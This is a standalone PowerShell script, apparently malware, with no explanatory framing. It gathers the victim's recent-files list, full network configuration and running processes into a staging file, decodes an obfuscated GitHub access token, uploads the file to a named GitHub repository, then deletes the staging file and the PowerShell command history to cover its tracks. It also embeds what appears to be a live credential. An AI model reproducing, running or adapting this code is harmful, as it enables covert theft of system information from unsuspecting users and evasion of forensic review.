[Net.ServicePointManager]::SecurityProtocol +='tls12'

function git-uploadfile {
    param (
        $token,
        $message = '',
        $file,
        $owner,
        $repo,
        $path = '.\',
        $sha,
        [switch]$force
    )

    $path = (Join-Path $path (Split-Path $file -Leaf))

    $base64token = [System.Convert]::ToBase64String([char[]]$token)

    $headers = @{
        Authorization = 'Basic {0}' -f $base64token
    }

    if ($force -and !$sha) {
        $sha = $(
            try {
                (git-getfile -token $token -owner $owner -repo $repo -path $path).sha
            } catch {
                $null
            }
        )
    }

    $body = @{
        message = $message
        content = [convert]::ToBase64String((Get-Content $file -Encoding Byte))
        sha = $sha
    } | ConvertTo-Json

    Invoke-RestMethod -Headers $headers -Uri https://api.github.com/repos/$owner/$repo/contents/$path -Body $body -Method Put
}


$filename=$env:appdata+'\icache.db'
$rc = Get-ChildItem ([Environment]::GetFolderPath('Recent'))
$ic = ipconfig /all
$gp=Get-process

ac $filename $rc -Encoding 'utf8'
ac $filename $ic
ac $filename $gp;

$ken = [convert]::fromBase64String('Z2hwX2Qza1Y4YnlDWk1PVVJ3anVTNmlQSWdBQWdxOVhXSzIyZHpjZQ==')
$ken = [System.Text.Encoding]::UTF8.GetString($ken)
git-uploadfile -token $ken -file $filename -owner musai51 -repo yanni -path carry -force
remove-item $filename -force



$lkj = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
$fff = Test-Path $lkj
if($fff -eq $True)
{
	Remove-Item -path $lkj -Recurse
}
